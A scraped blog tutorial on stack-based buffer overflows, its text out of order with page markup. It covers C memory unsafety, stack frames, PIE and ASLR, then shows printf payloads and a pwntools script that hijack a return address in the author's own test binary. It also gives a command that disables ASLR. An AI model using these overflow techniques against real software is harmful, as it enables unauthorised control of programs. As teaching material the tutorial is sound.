(gdb) run \u003c \u003c(printf 'AAAAAAAAAAAAAAAA\\x96\\x11\\x40\\x00\\x00\\x00\\x00\\x00') The first breakpoint is after the buffer overflow has already happened\nLet’s examine the stack\n(gdb) x/4xg $rbp - 8 0x7fffffffde48:\t0x4141414141414141\t0x4141414141414141 0x7fffffffde58:\t0x0000000000401196\t0x00007fffffffdf00 We can see saved rbp is overwritten with 0x4141414141414141 and return address is overwritten with 0x0000000000401196.\nNext breakpoint is right after grantAccess is called\n(gdb) c Continuing. Enter password: Authentication Failed Breakpoint 2, 0x0000000000401196 in grantAccess () (gdb) x/2xg $rbp - 8 0x4141414141414139:\tCannot access memory at address 0x4141414141414139 (gdb) p $rbp $6 = (void *) 0x4141414141414141 We can see $rbp contains the overflowed AA... string.\nBut after the prologue of grantAccess runs $rbp contains a valid value. Since we have valid value in $rsp, this command mov rbp,rsp will set it set it to $rsp.\n(gdb) disass grantAccess Dump of assembler code for function grantAccess: =\u003e 0x0000000000401196 \u003c+0\u003e:\tendbr64 0x000000000040119a \u003c+4\u003e:\tpush rbp 0x000000000040119b \u003c+5\u003e:\tmov rbp,rsp 0x000000000040119e \u003c+8\u003e:\tmov edi,0x402004 0x00000000004011a3 \u003c+13\u003e:\tcall 0x401070 0x00000000004011a8 \u003c+18\u003e:\tnop 0x00000000004011a9 \u003c+19\u003e:\tpop rbp 0x00000000004011aa \u003c+20\u003e:\tret (gdb) p $rbp $7 = (void *) 0x7fffffffde58 (gdb) x/2xg $rbp 0x7fffffffde58:\t0x4141414141414141\t0x00007fffffffdf00 We can see the 0x4141414141414141 is still stored in stack in place of saved rbp again, but the 0x00007fffffffdf00 is not a valid return address at all, its because we came to grantAccess funcion using the jump instruction which doesn’t save the return address unlike call command.\nThe address 0x00007fffffffdf00 is the saved frame pointer (RBP) from main’s stack frame\nStack of main: +-------------------------------+ | Return address (to libc) | ← 0x00007ffff7c2a1ca +-------------------------------+ | Saved RBP (from main) | ← 0x00007fffffffdf00 ← THIS ONE! +-------------------------------+ | main's local variables | +-------------------------------+ The CPU tries to execute code at 0x00007fffffffdf00, but this address contains stack data (main’s saved RBP), not executable code.\nSo this is the value which causes the segfault, not the garbage value we entered.\nPosition Independent Executable Without ASLR Now let’s compile the binary without -fno-pie and -no-pie which will compile the binary into a Position Independent Executable which is a default in GCC.\n$ gcc -fno-stack-protector -O0 -o vuln main $ objdump -d -M intel,mnemonic,no-att -j .text vuln vuln: file format elf64-x86-64 Disassembly of section .text: 00000000000010c0 \u003c_start\u003e: 10c0:\tf3 0f 1e fa endbr64 10c4:\t31 ed xor ebp,ebp 10c6:\t49 89 d1 mov r9,rdx 10c9:\t5e pop rsi 10ca:\t48 89 e2 mov rdx,rsp 10cd:\t48 83 e4 f0 and rsp,0xfffffffffffffff0 10d1:\t50 push rax 10d2:\t54 push rsp 10d3:\t45 31 c0 xor r8d,r8d 10d6:\t31 c9 xor ecx,ecx 10d8:\t48 8d 3d 9a 01 00 00 lea rdi,[rip+0x19a] # 1279 10df:\tff 15 f3 2e 00 00 call QWORD PTR [rip+0x2ef3] # 3fd8 \u003c__libc_start_main@GLIBC_2.34\u003e 10e5:\tf4 hlt 10e6:\t66 2e 0f 1f 84 00 00 cs nop WORD PTR [rax+rax*1+0x0] 10ed:\t00 00 00 00000000000011a9 : 11a9:\tf3 0f 1e fa endbr64 11ad:\t55 push rbp 11ae:\t48 89 e5 mov rbp,rsp 11b1:\t48 8d 05 4c 0e 00 00 lea rax,[rip+0xe4c] # 2004 \u003c_IO_stdin_used+0x4\u003e 11b8:\t48 89 c7 mov rdi,rax 11bb:\te8 c0 fe ff ff call 1080 11c0:\t90 nop 11c1:\t5d pop rbp 11c2:\tc3 ret 00000000000011c3 : 11c3:\tf3 0f 1e fa endbr64 11c7:\t55 push rbp 11c8:\t48 89 e5 mov rbp,rsp 11cb:\t48 83 ec 10 sub rsp,0x10 11cf:\t48 89 7d f8 mov QWORD PTR [rbp-0x8],rdi 11d3:\t48 89 75 f0 mov QWORD PTR [rbp-0x10],rsi 11d7:\t48 8b 45 f8 mov rax,QWORD PTR [rbp-0x8] 11db:\t48 8d 15 31 0e 00 00 lea rdx,[rip+0xe31] # 2013 \u003c_IO_stdin_used+0x13\u003e 11e2:\t48 89 d6 mov rsi,rdx 11e5:\t48 89 c7 mov rdi,rax 11e8:\te8 b3 fe ff ff call 10a0 11ed:\t85 c0 test eax,eax 11ef:\t75 0a jne 11fb 11f1:\t48 8b 45 f0 mov rax,QWORD PTR [rbp-0x10] 11f5:\tc7 00 01 00 00 00 mov DWORD PTR [rax],0x1 11fb:\t90 nop 11fc:\tc9 leave 11fd:\tc3 ret 00000000000011fe : 11fe:\tf3 0f 1e fa endbr64 1202:\t55 push rbp 1203:\t48 89 e5 mov rbp,rsp 1206:\t48 83 ec 10 sub rsp,0x10 120a:\tc7 45 f4 00 00 00 00 mov DWORD PTR [rbp-0xc],0x0 1211:\t48 8d 05 04 0e 00 00 lea rax,[rip+0xe04] # 201c \u003c_IO_stdin_used+0x1c\u003e 1218:\t48 89 c7 mov rdi,rax 121b:\tb8 00 00 00 00 mov eax,0x0 1220:\te8 6b fe ff ff call 1090 1225:\t48 8d 45 f8 lea rax,[rbp-0x8] 1229:\t48 89 c6 mov rsi,rax 122c:\t48 8d 05 fa 0d 00 00 lea rax,[rip+0xdfa] # 202d \u003c_IO_stdin_used+0x2d\u003e 1233:\t48 89 c7 mov rdi,rax 1236:\tb8 00 00 00 00 mov eax,0x0 123b:\te8 70 fe ff ff call 10b0 \u003c__isoc99_scanf@plt\u003e 1240:\t48 8d 55 f4 lea rdx,[rbp-0xc] 1244:\t48 8d 45 f8 lea rax,[rbp-0x8] 1248:\t48 89 d6 mov rsi,rdx 124b:\t48 89 c7 mov rdi,rax 124e:\te8 70 ff ff ff call 11c3 1253:\t8b 45 f4 mov eax,DWORD PTR [rbp-0xc] 1256:\t83 f8 01 cmp eax,0x1 1259:\t75 0c jne 1267 125b:\tb8 00 00 00 00 mov eax,0x0 1260:\te8 44 ff ff ff call 11a9 1265:\teb 0f jmp 1276 1267:\t48 8d 05 c2 0d 00 00 lea rax,[rip+0xdc2] # 2030 \u003c_IO_stdin_used+0x30\u003e 126e:\t48 89 c7 mov rdi,rax 1271:\te8 0a fe ff ff call 1080 1276:\t90 nop 1277:\tc9 leave 1278:\tc3 ret 0000000000001279 : 1279:\tf3 0f 1e fa endbr64 127d:\t55 push rbp 127e:\t48 89 e5 mov rbp,rsp 1281:\tb8 00 00 00 00 mov eax,0x0 1286:\te8 73 ff ff ff call 11fe 128b:\tb8 00 00 00 00 mov eax,0x0 1290:\t5d pop rbp 1291:\tc3 ret Few differences we can note between disassembly of PIE and non PIE binaries are\n1. PIE uses relative addressing everywhere\nThe non-PIE version uses absolute addresses\n40119e: bf 04 20 40 00 mov edi,0x402004 The PIE version uses RIP-relative addressing\n11b1:\t48 8d 05 4c 0e 00 00 lea rax,[rip+0xe4c] Position-Independent Executables are designed so the loader can place them at any base address in memory. To support this, the code must avoid using fixed, hard-coded absolute addresses. When the binary is relocated, the relative distances between instructions and sections stay the same, but their absolute virtual addresses change. Because of this relocation, any instruction containing a literal absolute address would become invalid, which is why PIE relies on RIP-relative addressing instead of fixed addresses.\n2. Difference in Base Address\nIn non-PIE executables, the virtual addresses in the ELF file are fixed and assume the traditional ELF load base of 0x400000. This is why their .text and other segments appear at small, low canonical addresses (e.g., 0x401000). The loader places them exactly there because they are not relocatable.\nIn contrast, PIE executables behave like shared libraries: they are compiled to be fully relocatable, and the loader chooses where to map them at runtime. When ASLR is enabled, the loader typically places PIE binaries much higher in the address space (e.g., 0x55xxxxxxx000 on Linux) so it can randomize the base address for security. That’s why PIE binaries show up at high addresses, while non-PIE binaries always sit near 0x400000.\nASLR has no effect on non PIE executables. For PIE executables, when ASLR is disabled, the base address will always be 0x555555554000, when ASLR is enabled, it will be a random address.\nProcess Maps A process map (also called memory map, address space map, or proc map) is a view of how a running process’s virtual memory is laid out. It shows which memory regions exist, where they are located, how large they are, what permissions they have, and what each region belongs to (code, stack, heap, shared libraries, etc.).\nYou typically view this in Linux using:\ncat /proc//maps or inside gdb using:\ninfo proc mappings What the Process Map Represents?\nEvery process runs inside its own virtual address space, which the OS divides into segments. The process map lists these segments, such as:\n1. The Program Itself\nThese entries correspond to your binary: •\t.text (code) •\t.rodata (read-only data) •\t.data (initialized global data) •\t.bss (uninitialized global data)\nThey are shown with r-xp, r--p, rw-p permissions depending on their use.\n2. The Heap\nA dynamically growing region used by: •\tmalloc •\tnew •\tdynamic data structures\n3. Shared Libraries\nLoaded .so files like: •\tlibc •\tlibpthread •\tld-linux loader\nEach library has multiple mapped regions (code, data, etc.).\nThe Stack One big region for the program’s main thread:\nHolds: •\treturn addresses •\tlocal variables •\tsaved registers •\tstack frames\nMemory-Mapped Files Any file mapped by mmap() (config files, JIT regions, etc.) Example:\n/memfd:x/y (deleted) Special Kernel Regions Such as: •\t[vdso] •\t[vvar] •\t[vsyscall]\nUsed to optimize system calls and provide kernel data.\nUsing this we can inspect the process’s and figure out the base address, this works even if ASLR is enabled, but it means the attacker should have access to your computer.\nWe can disable ASLR system wide by\n$ echo 0 | sudo tee /proc/sys/kernel/randomize_va_space We can run the program and get its pid\n$ ps aux | grep vuln sanketh 12839 0.0 0.0 2680 1380 pts/1 S+ 16:19 0:00 /home/sanketh/Desktop/vuln We can get its map using\n$ cat /proc/12839/maps 555555554000-555555555000 r--p 00000000 08:01 48496671 /home/sanketh/Desktop/vuln 555555555000-555555556000 r-xp 00001000 08:01 48496671 /home/sanketh/Desktop/vuln 555555556000-555555557000 r--p 00002000 08:01 48496671 /home/sanketh/Desktop/vuln 555555557000-555555558000 r--p 00002000 08:01 48496671 /home/sanketh/Desktop/vuln 555555558000-555555559000 rw-p 00003000 08:01 48496671 /home/sanketh/Desktop/vuln 555555559000-55555557a000 rw-p 00000000 00:00 0 [heap] 7ffff7c00000-7ffff7c28000 r--p 00000000 08:01 78907426 /usr/lib/x86_64-linux-gnu/libc.so.6 7ffff7c28000-7ffff7db0000 r-xp 00028000 08:01 78907426 /usr/lib/x86_64-linux-gnu/libc.so.6 7ffff7db0000-7ffff7dff000 r--p 001b0000 08:01 78907426 /usr/lib/x86_64-linux-gnu/libc.so.6 7ffff7dff000-7ffff7e03000 r--p 001fe000 08:01 78907426 /usr/lib/x86_64-linux-gnu/libc.so.6 7ffff7e03000-7ffff7e05000 rw-p 00202000 08:01 78907426 /usr/lib/x86_64-linux-gnu/libc.so.6 7ffff7e05000-7ffff7e12000 rw-p 00000000 00:00 0 7ffff7fa6000-7ffff7fa9000 rw-p 00000000 00:00 0 7ffff7fbd000-7ffff7fbf000 rw-p 00000000 00:00 0 7ffff7fbf000-7ffff7fc1000 r--p 00000000 00:00 0 [vvar] 7ffff7fc1000-7ffff7fc3000 r--p 00000000 00:00 0 [vvar_vclock] 7ffff7fc3000-7ffff7fc5000 r-xp 00000000 00:00 0 [vdso] 7ffff7fc5000-7ffff7fc6000 r--p 00000000 08:01 78906094 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 7ffff7fc6000-7ffff7ff1000 r-xp 00001000 08:01 78906094 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 7ffff7ff1000-7ffff7ffb000 r--p 0002c000 08:01 78906094 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 7ffff7ffb000-7ffff7ffd000 r--p 00036000 08:01 78906094 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 7ffff7ffd000-7ffff7fff000 rw-p 00038000 08:01 78906094 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0 [stack] ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0 [vsyscall] This confirms what we were expecting, if ASLR is disabled, base address will be 0x555555554000. Adding this to grantAccess’s address gives 0x5555555551a9\n$ printf 'AAAAAAAAAAAAAAAA\\xa9\\x51\\x55\\x55\\x55\\x55\\x00\\x00' | ./vuln Enter password: Authentication Failed Access Granted Segmentation fault (core dumped) Position Independent Executable Without ASLR We can build the payload similarly when ASLR is enabled\n$ cat /proc/13003/maps 5af5bbc3d000-5af5bbc3e000 r--p 00000000 08:01 48496671 /home/sanketh/Desktop/vuln 5af5bbc3e000-5af5bbc3f000 r-xp 00001000 08:01 48496671 /home/sanketh/Desktop/vuln 5af5bbc3f000-5af5bbc40000 r--p 00002000 08:01 48496671 /home/sanketh/Desktop/vuln 5af5bbc40000-5af5bbc41000 r--p 00002000 08:01 48496671 /home/sanketh/Desktop/vuln 5af5bbc41000-5af5bbc42000 rw-p 00003000 08:01 48496671 /home/sanketh/Desktop/vuln 5af5cf6f7000-5af5cf718000 rw-p 00000000 00:00 0 [heap] 70f2a1e00000-70f2a1e28000 r--p 00000000 08:01 78907426 /usr/lib/x86_64-linux-gnu/libc.so.6 70f2a1e28000-70f2a1fb0000 r-xp 00028000 08:01 78907426 /usr/lib/x86_64-linux-gnu/libc.so.6 70f2a1fb0000-70f2a1fff000 r--p 001b0000 08:01 78907426 /usr/lib/x86_64-linux-gnu/libc.so.6 70f2a1fff000-70f2a2003000 r--p 001fe000 08:01 78907426 /usr/lib/x86_64-linux-gnu/libc.so.6 70f2a2003000-70f2a2005000 rw-p 00202000 08:01 78907426 /usr/lib/x86_64-linux-gnu/libc.so.6 70f2a2005000-70f2a2012000 rw-p 00000000 00:00 0 70f2a2152000-70f2a2155000 rw-p 00000000 00:00 0 70f2a2169000-70f2a216b000 rw-p 00000000 00:00 0 70f2a216b000-70f2a216d000 r--p 00000000 00:00 0 [vvar] 70f2a216d000-70f2a216f000 r--p 00000000 00:00 0 [vvar_vclock] 70f2a216f000-70f2a2171000 r-xp 00000000 00:00 0 [vdso] 70f2a2171000-70f2a2172000 r--p 00000000 08:01 78906094 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 70f2a2172000-70f2a219d000 r-xp 00001000 08:01 78906094 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 70f2a219d000-70f2a21a7000 r--p 0002c000 08:01 78906094 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 70f2a21a7000-70f2a21a9000 r--p 00036000 08:01 78906094 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 70f2a21a9000-70f2a21ab000 rw-p 00038000 08:01 78906094 /usr/lib/x86_64-linux-gnu/ld-linux-x86-64.so.2 7ffffb176000-7ffffb197000 rw-p 00000000 00:00 0 [stack] ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0 [vsyscall] The base address is 0x5af5bbc3d000 which is randomly generated. The address of grantAccess is 0x5af5bbc3e1a9\nSince we need to run the program and inspect it to build the payload, we can’t use te command line utilities like printf like earlier to pass raw bytes as input. So we can write a python script using pwntools which rums the program, inspects it, builds the payload and passes it to the program as raw bytes.\n#!/usr/bin/env python3 from pwn import * # Start the process p = process('./vuln') # Read base address from /proc maps with open(f'/proc/{p.pid}/maps') as f: for line in f: if 'r-xp' in line and 'vuln' in line: text_base = int(line.split('-')[0], 16) break # Calculate grantAccess address grant_access = text_base + 0x1a9 log.info(f\"PID: {p.pid}\") log.info(f\"Text base: {hex(text_base)}\") log.info(f\"grantAccess: {hex(grant_access)}\") # Build payload payload = b'A' * 16 + p64(grant_access) # Just send it directly (the program is waiting for input) p.sendline(payload) # Receive everything output = p.recvall(timeout=1).decode() print(output) p.close() (venv) $ python3 exploit3.py [+] Starting local process './vuln': pid 4208 [*] PID: 4208 [*] Text base: 0x5dc755119000 [*] grantAccess: 0x5dc7551191a9 [+] Receiving all data: Done (53B) [*] Stopped process './vuln' (pid 4208) Enter password: Authentication Failed Access Granted For Overflowing small buffers, some of hacks involve placing the shellcdoe into an environment variable, which will be placed at the top of the stack (as envp, argc, argv are parameters to main function), the buffer then tries to overwrite the return address pointing to the environment variable’s location on stack. But these are unrealistic in today’s date considering ASLR in 64-bit systems is super solid.\n","wordCount":"6283","inLanguage":"en","datePublished":"2025-11-11T00:00:00Z","dateModified":"2025-11-11T00:00:00Z","author":{"@type":"Person","name":"Sanketh"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://sankethbk.github.io/blog/posts/reverse-engineering/vulnerabilities/2025-11-11-stack-based-buffer-overflow-attacks/"},"publisher":{"@type":"Organization","name":"Sanketh's Blog","logo":{"@type":"ImageObject","url":"https://sankethbk.github.io/blog/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://sankethbk.github.io/blog/ accesskey=h title="Sanketh's Blog (Alt + H)">Sanketh's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu></ul></nav></header><main class=main><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.css><script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/katex.min.js></script><script defer src=https://cdn.jsdelivr.net/npm/katex@0.16.4/dist/contrib/auto-render.min.js onload=renderMathInElement(document.body)></script><article class=post-single><header class=post-header><h1 class="post-title entry-hint-parent">Stack Based Buffer Overflow Attacks</h1><div class=post-meta><span title='2025-11-11 00:00:00 +0000 UTC'>November 11, 2025</span>&nbsp;·&nbsp;30 min&nbsp;·&nbsp;Sanketh&nbsp;|&nbsp;<a href=https://github.com/SankethBK/blog/edit/main/content/posts/reverse-engineering/vulnerabilities/2025-11-11-stack-based-buffer-overflow-attacks.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#stack-based-buffer-overflow-attacks aria-label="Stack Based Buffer Overflow Attacks">Stack Based Buffer Overflow Attacks</a><ul><li><a href=#causes-of-buffer-overflow-attacks-in-c aria-label="Causes of Buffer Overflow Attacks in C">Causes of Buffer Overflow Attacks in C</a><ul><li><a href=#1-c-allows-writing-beyond-and-before-array-bounds aria-label="1. C allows writing beyond (and before) array bounds">1. C allows writing beyond (and before) array bounds</a></li><li><a href=#2-c-strings-rely-on-null-termination aria-label="2. C strings rely on null termination">2. C strings rely on null termination</a></li><li><a href=#3-direct-pointer-arithmetic aria-label="3. Direct pointer arithmetic">3. Direct pointer arithmetic</a></li></ul></li><li><a href=#what-is-stack aria-label="What is Stack?">What is Stack?</a><ul><li><a href=#why-a-stack-specifically-lifo aria-label="Why a stack specifically (LIFO)?">Why a stack specifically (LIFO)?</a></li><li><a href=#structure-of-a-stack-frame aria-label="Structure of a Stack Frame">Structure of a Stack Frame</a></li><li><a href=#what-happens-during-a-function-call aria-label="What Happens During a Function Call">What Happens During a Function Call</a><ul><li><a href=#1-callers-responsibilities-before-the-jump aria-label="1. Caller&rsquo;s Responsibilities (Before the Jump):">1. Caller&rsquo;s Responsibilities (Before the Jump):</a></li><li><a href=#2-callees-responsibilities-function-prologue aria-label="2. Callee&rsquo;s Responsibilities (Function Prologue):">2. Callee&rsquo;s Responsibilities (Function Prologue):</a></li><li><a href=#3-function-execution aria-label="3. Function Execution:">3. Function Execution:</a></li><li><a href=#4-callees-responsibilities-function-epilogue aria-label="4. Callee&rsquo;s Responsibilities (Function Epilogue):">4. Callee&rsquo;s Responsibilities (Function Epilogue):</a></li></ul></li><li><a href=#simplified-function-call-with-callretleave aria-label="Simplified Function Call with CALL/RET/LEAVE">Simplified Function Call with CALL/RET/LEAVE</a><ul><li><a href=#the-call-instruction aria-label="The CALL Instruction:">The CALL Instruction:</a></li><li><a href=#the-leave-instruction aria-label="The LEAVE Instruction:">The LEAVE Instruction:</a></li><li><a href=#the-ret-instruction aria-label="The RET Instruction:">The RET Instruction:</a></li><li><a href=#complete-example-with-simplified-instructions aria-label="Complete Example with Simplified Instructions:">Complete Example with Simplified Instructions:</a></li></ul></li></ul></li><li><a href=#buffer-overflow-attacks aria-label="Buffer OverFlow Attacks">Buffer OverFlow Attacks</a><ul><li><a href=#1-overwriting-a-variable-on-stack aria-label="1. Overwriting a Variable On Stack">1. Overwriting a Variable On Stack</a></li><li><a href=#2-overwriting-the-return-address-on-the-stack aria-label="2. Overwriting the Return Address on the Stack">2. Overwriting the Return Address on the Stack</a><ul><li><a href=#non-position-independent-executable aria-label="Non Position Independent Executable">Non Position Independent Executable</a></li><li><a href=#position-independent-executable-without-aslr aria-label="Position Independent Executable Without ASLR">Position Independent Executable Without ASLR</a><ul><li><a href=#process-maps aria-label="Process Maps">Process Maps</a></li></ul></li><li><a href=#position-independent-executable-without-aslr-1 aria-label="Position Independent Executable Without ASLR">Position Independent Executable Without ASLR</a></li></ul></li></ul></li></ul></li></ul></div></details></div><div class=post-content><h1 id=stack-based-buffer-overflow-attacks>Stack Based Buffer Overflow Attacks<a hidden class=anchor aria-hidden=true href=#stack-based-buffer-overflow-attacks>#</a></h1><p>A buffer overflow occurs when a program writes more data into a fixed-size buffer than it was designed to hold. A buffer is a contiguous block of memory allocated to store data (e.g., an array/string whose length is defined at compile time).</p><h2 id=causes-of-buffer-overflow-attacks-in-c>Causes of Buffer Overflow Attacks in C<a hidden class=anchor aria-hidden=true href=#causes-of-buffer-overflow-attacks-in-c>#</a></h2><p>When we talk about buffer overflows, its almost always about buffer overflows in C programs because of the way the following things are designed in C:</p><h3 id=1-c-allows-writing-beyond-and-before-array-bounds>1. C allows writing beyond (and before) array bounds<a hidden class=anchor aria-hidden=true href=#1-c-allows-writing-beyond-and-before-array-bounds>#</a></h3><ul><li>Arrays in C are just raw memory.</li><li>The compiler does not perform runtime checks.</li><li>If you write past <code>buf[63]</code>, C simply writes into whatever memory comes next.</li></ul><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>char</span> buf[<span style=color:#ae81ff>64</span>];
</span></span><span style=display:flex><span>buf[<span style=color:#ae81ff>100</span>] <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;A&#39;</span>;   <span style=color:#75715e>// C happily writes here → overflow
</span></span></span></code></pre></div><p>No warning, no crash, memory is overwritten silently.</p><h3 id=2-c-strings-rely-on-null-termination>2. C strings rely on null termination<a hidden class=anchor aria-hidden=true href=#2-c-strings-rely-on-null-termination>#</a></h3><p>C treats strings as a sequence of characters until it encounters a null termination character <code>\0</code></p><p>Problems caused by this:</p><ul><li>Functions like <code>strcpy</code>, <code>gets</code>, <code>scanf("%s")</code> keep copying until they hit a null byte — not until the buffer ends.</li><li>If input lacks a null terminator early enough, it will overflow.</li></ul><h3 id=3-direct-pointer-arithmetic>3. Direct pointer arithmetic<a hidden class=anchor aria-hidden=true href=#3-direct-pointer-arithmetic>#</a></h3><p>C allows writing to any address you compute.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#f92672>*</span>(buf <span style=color:#f92672>+</span> <span style=color:#ae81ff>80</span>) <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;X&#39;</span>;
</span></span></code></pre></div><p>Since the memory layout of a program was quite predictable before the mitigations like ASLR arrived, attackers could easily calculate which address needs to be overwritten with what value.</p><h2 id=what-is-stack>What is Stack?<a hidden class=anchor aria-hidden=true href=#what-is-stack>#</a></h2><p>Stack is a segment of memory where the process stores function context: particularly function calls and its local variables.</p><p>Before Stack, programmers didn&rsquo;t have a definite way of doing these things:</p><ul><li>Where to store function arguments</li><li>Where to store local variables</li><li>Where to store the return address (so CPU knows where to go back)</li><li>How to make function calls nested (A → B → C → D …)</li><li>How to handle recursion (function calling itself multiple times)</li></ul><p>Some of the earlier assembly languages didn&rsquo;t have the concept of stack, programmers had to simulate the stack on their own on a raw block of memory. Today all the mainstream CPU&rsquo;s have support for stack at the hardware level.</p><h3 id=why-a-stack-specifically-lifo>Why a stack specifically (LIFO)?<a hidden class=anchor aria-hidden=true href=#why-a-stack-specifically-lifo>#</a></h3><p>Function calls behave naturally like a Last-In-First-Out structure.</p><p>Example:</p><pre tabindex=0><code>main calls A
A calls B
B calls C
</code></pre><p>Order of returning:</p><pre tabindex=0><code>C returns to B
B returns to A
A returns to main
</code></pre><p>This is literally a LIFO pattern, a stack is the perfect structure.</p><h3 id=structure-of-a-stack-frame>Structure of a Stack Frame<a hidden class=anchor aria-hidden=true href=#structure-of-a-stack-frame>#</a></h3><p>A stack frame is a single entry in the call stack that contains all the local variables and metadata associated with a function invocation. In a nested function call chain, each function maintains its own distinct stack frame, creating a LIFO (Last-In-First-Out) structure.</p><p><strong>Register Management in x86:</strong></p><ul><li>The <strong>EBP (Base Pointer)</strong> register marks the base of the currently active stack frame</li><li>The <strong>ESP (Stack Pointer)</strong> register points to the top of the stack</li></ul><p><strong>The Reality of Function Calls:</strong></p><p>While high-level languages like C use function call syntax, the underlying assembly implementation is fundamentally different. At the assembly level, there is no native concept of &ldquo;functions&rdquo;—each function call is simply a jump to a different memory location containing executable instructions.</p><p>This creates an important challenge: since function calls are just jumps, how do the caller and callee exchange information? How are parameters passed? Where should return values be placed?</p><p><strong>The Application Binary Interface (ABI):</strong></p><p>The solution is the ABI—a standardized calling convention that defines the contract between caller and callee. The ABI specifies:</p><ul><li>How arguments are passed (registers vs. stack)</li><li>Which registers are preserved across calls</li><li>Where return values are stored</li><li>How the stack frame is set up and torn down</li></ul><p>Without this agreement, function calls across separately compiled code would be impossible, as each piece of code would have different expectations about parameter passing and register usage.</p><p>Let&rsquo;s take an example</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-text-size-adjust:none><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>() {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>A</span>(<span style=color:#ae81ff>5</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>A</span>(<span style=color:#66d9ef>int</span> a) {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>B</span>(<span style=color:#ae81ff>3</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>B</span>(<span style=color:#66d9ef>int</span> b) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> local_var1;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>char</span> local_var2;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>The stack for this code when C is called will look like this:</p><pre tabindex=0><code>Higher Memory Addresses (0xFFFFFFFF)
↑
|
|                    STACK GROWTH DIRECTION
|                           ↓↓↓
|
+------------------+
|   Arguments      |  ← Arguments for function A (if any)
|   for A          |
+------------------+
|   Return Addr    |  ← Where to return after A finishes (e.g., main)
|   to main        |
+------------------+
|   Saved EBP      |  ← main&#39;s base pointer
|   (main&#39;s frame) |
+------------------+ ← EBP when A is executing (A&#39;s frame base)
|   A&#39;s Local      |
|   Variables      |
|   - local_var1   |
|   - local_var2   |
+------------------+
|   Arguments      |  ← Arguments pushed for B (right to left in C)
|   for B          |    e.g., arg2, arg1
+------------------+
|   Return Addr    |  ← Where to return in A after B finishes
|   to A           |
+------------------+
|   Saved EBP      |  ← A&#39;s base pointer saved
|   (A&#39;s frame)    |
+------------------+ ← EBP (Current frame base - B is executing)
|   B&#39;s Local      |
|   Variables      |
|   - local_var1   |
|   - local_var2   |
+------------------+ ← ESP (Stack pointer - top of stack)
|                  |
|   (Unused        |
|    Stack         |
|    Space)        |
|                  |
↓
Lower Memory Addresses (0x00000000)
</code></pre><h3 id=what-happens-during-a-function-call>What Happens During a Function Call<a hidden class=anchor aria-hidden=true href=#what-happens-during-a-function-call>#</a></h3><p>Now let&rsquo;s look at thx86 assembly code for what happens when a function is called</p><h4 id=1-callers-responsibilities-before-the-jump>1. Caller&rsquo;s Responsibilities (Before the Jump):<a hidden class=anchor aria-hidden=true href=#1-callers-responsibilities-before-the-jump>#</a></h4><p>First, the caller must save the return address—the location where execution should resume after the function completes. Let&rsquo;s see what happens when function A calls function B.</p><pre tabindex=0><code>push arguments_to_function_B (pushed in reverse order)
push next_instruction_address_of_function_A (the value in EIP register)
jmp address_of_function_B 
